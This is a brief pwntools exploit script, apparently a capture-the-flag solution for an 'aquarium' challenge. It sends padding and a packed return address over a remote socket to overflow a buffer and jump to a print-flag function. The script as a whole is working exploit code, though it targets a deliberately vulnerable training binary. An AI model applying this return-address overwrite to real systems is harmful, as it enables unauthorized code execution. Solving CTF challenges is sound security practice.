#!/usr/bin/env python

from pwn import *

NUM_JUNK = 0xd4
PRINT_FLAG_ADDR = 0x4011a6

def recv_response(p):
    r = p.recv()
    print "[+] Response: " + r
    return r

p = remote("shell.actf.co", 19305)
#p = process("./aquarium")

# send rubbish for the other parameters
for i in range(0, 6):
    recv_response(p)
    p.sendline("1")

buf = "a" * 0x40
buf += "\x00"
buf += "b" * 0x100
buf += p64(PRINT_FLAG_ADDR)

#gdb.attach(p)

print "[+] Here comes the exploit: "
recv_response(p)
p.sendline(buf)

recv_response(p)

p.interactive()
